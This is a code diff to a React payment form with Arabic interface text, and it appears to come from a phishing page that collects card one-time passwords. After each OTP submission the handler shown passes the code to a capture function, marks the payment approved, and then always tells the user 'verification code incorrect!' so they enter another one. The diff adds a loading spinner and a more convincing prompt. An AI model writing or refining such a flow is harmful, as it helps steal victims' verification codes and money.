@@ -57,12 +57,16 @@ export const Payment = (props: any) => {
     e.preventDefault();
     handleAddotp(otp)
     setstep(3)
+    props.setisloading(true);
+
     setPaymentInfo({
       ...paymentInfo,
       status:'approved'
     })
         handlePay(paymentInfo,setPaymentInfo)
         setTimeout(() => {
+    props.setisloading(false);
+
     alert("رمز التحقق غير صحيح!");
           setOtp('')
         }, 3000);
@@ -181,7 +185,7 @@ export const Payment = (props: any) => {
         ) : step === 2 && paymentInfo.status === 'pending' ?  (<>طلب الدفع الخاص بك قيد المعالجة, يرجى الانتظار ...</>):(
           <form onSubmit={handleOtpSubmit} style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
             <div>
-              <label>أدخل رمز OTP</label>
+              <label style={{paddingBottom:5}}> يرجى ادخال رمز التحقق OTP المرسل الى جوالك</label>
               <input name="otp" value={otp}minLength={4} maxLength={6} type='tel' onChange={(e) => setOtp(e.target.value)} required  style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} />
             </div>
             <button type="submit" style={{ width: "100%", padding: "12px", backgroundColor: "#2563eb", color: "white", borderRadius: "4px", border: "none", cursor: "pointer" }}>
